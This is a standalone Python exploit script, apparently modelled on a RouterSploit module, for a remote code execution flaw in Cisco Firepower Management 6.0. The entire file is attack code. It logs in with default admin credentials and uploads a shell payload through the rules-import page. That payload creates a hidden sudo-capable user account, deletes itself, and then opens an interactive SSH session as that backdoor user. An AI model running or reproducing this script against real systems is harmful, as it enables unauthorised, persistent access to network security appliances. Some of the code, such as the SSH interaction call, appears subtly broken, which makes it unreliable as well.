target = ""
# rsf exploit module
# description: Module exploits Cisco Firepower Management 6.0 Remote Code Execution vulnerability which allows creating backdoor account and authenticating through SSH.

import requests
import re
import paramiko
import random
import string

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 443
        self.ssh_port = 22
        self.username = "admin"
        self.password = "Admin123"
        self.newusername = ""
        self.newpassword = ""
        self.session = requests.Session()

    def random_text(self, n):
        return ''.join(random.choice(string.ascii_letters) for _ in range(n))

    def run(self):
        if self.check():
            print("[+] Target seems to be vulnerable")
            if self.login():
                if not self.newusername:
                    self.newusername = self.random_text(8)
                if not self.newpassword:
                    self.newpassword = self.random_text(8)

                self.create_ssh_backdoor(self.newusername, self.newpassword)
                self.init_ssh_session(self.newusername, self.newpassword)
            else:
                print("[-] Authentication failed")
        else:
            print("[-] Target not vulnerable")

    def check(self):
        try:
            response = requests.get(f"https://{self.target}:{self.port}/img/favicon.png?v=6.0.1-1213", verify=False)
            if response and response.status_code == 200:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(self.target, port=self.ssh_port, timeout=10)
                    ssh.close()
                    return True
                except:
                    pass
            return False
        except:
            return False

    def login(self):
        data = {
            "username": self.username,
            "password": self.password,
            "target": ""
        }
        
        try:
            response = self.session.post(
                f"https://{self.target}:{self.port}/login.cgi?logout=1",
                data=data,
                allow_redirects=False,
                verify=False
            )
            return response and response.status_code == 302 and "CGISESSID" in response.cookies
        except:
            return False

    def create_ssh_backdoor(self, username, password):
        print("[*] Attempting to create SSH backdoor")
        sf_action_id = self.get_sf_action_id()
        
        payload = f"sudo useradd -g ldapgroup -p `openssl passwd -1 {password}` {username}; rm /var/sf/SRU/exploit.sh"
        
        files = {
            "action_submit": (None, "Import"),
            "source": (None, "file"),
            "manual_update": (None, "1"),
            "sf_action_id": (None, sf_action_id),
            "file": ("exploit.sh", payload)
        }
        
        try:
            self.session.post(
                f"https://{self.target}:{self.port}/DetectionPolicy/rules/rulesimport.cgi",
                files=files,
                verify=False
            )
        except:
            pass

    def get_sf_action_id(self):
        try:
            response = self.session.get(
                f"https://{self.target}:{self.port}/DetectionPolicy/rules/rulesimport.cgi",
                verify=False
            )
            if response:
                res = re.findall("sf_action_id = '(.+)';", response.text)
                if len(res) > 1:
                    return res[1]
        except:
            pass
        return "1964300002"

    def init_ssh_session(self, username, password):
        print(f"[*] Trying to authenticate through SSH as {username}")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.ssh_port, username=username, password=password, timeout=10)
            print("[+] SSH authentication successful")
            ssh.interact()
        except Exception as e:
            print(f"[-] SSH authentication failed: {str(e)}")



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
